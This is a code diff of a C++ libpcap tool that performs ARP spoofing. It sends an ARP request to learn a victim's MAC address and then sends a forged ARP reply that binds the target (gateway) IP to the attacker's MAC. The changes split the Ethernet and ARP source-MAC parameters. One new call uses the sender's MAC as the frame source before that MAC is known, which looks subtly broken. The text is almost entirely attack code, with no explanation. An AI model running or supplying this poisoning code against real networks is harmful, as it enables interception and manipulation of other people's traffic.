@@ -54,12 +54,12 @@ void get_ip(char* interface, Ip& attackerIp ){
    attackerIp = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 }
 
-void send_arp_packet(pcap_t* handle, Mac& eth_dmac, Mac& smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, int req_check ){
+void send_arp_packet(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, int req_check ){
 
 	EthArpPacket packet;
 
 	packet.eth_.dmac_ = eth_dmac;
-	packet.eth_.smac_ = smac;
+	packet.eth_.smac_ = eth_smac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -73,7 +73,7 @@ void send_arp_packet(pcap_t* handle, Mac& eth_dmac, Mac& smac, Ip& arp_sip, Mac&
 		packet.arp_.op_=htons(ArpHdr::Reply);
 	}
 	
-	packet.arp_.smac_ = smac;
+	packet.arp_.smac_ = arp_smac;
 	packet.arp_.sip_ = htonl(arp_sip);
 	packet.arp_.tmac_ = arp_tmac;
 	packet.arp_.tip_ = htonl(arp_tip);
@@ -135,7 +135,7 @@ int main(int argc, char* argv[]) {
 		Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
 		Mac zero = Mac("00:00:00:00:00:00");
 		Mac smac;
-		send_arp_packet(handle, broadcast, attackerMac, attackerIp, zero, senderIp, 1 );
+		send_arp_packet(handle, broadcast, senderMac,attackerMac, attackerIp, zero, senderIp, 1 );
 		int res;
 		while (true) {
 			struct pcap_pkthdr* header;
@@ -146,12 +146,13 @@ int main(int argc, char* argv[]) {
 				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 				break;
 			}
+
 			struct EthArpPacket *eth_arp_packet = (struct EthArpPacket *)packet;
 			if (ipv4_arp_checker(eth_arp_packet,senderIp,attackerMac)){
 				cout << "[sender IP Address " << string(eth_arp_packet->arp_.sip()) << "]\n";
 				cout << "[sender MAC Address " << string(eth_arp_packet->arp_.smac()) << "]\n";
-				smac=eth_arp_packet->arp_.smac();
-				send_arp_packet(handle, smac, attackerMac, targetIp,smac, senderIp, 0 );
+				senderMac=eth_arp_packet->arp_.smac();
+				send_arp_packet(handle, senderMac, attackerMac, attackerMac,targetIp,senderMac, senderIp, 0 );
 				printf("complete\n");
 				break;
 			}
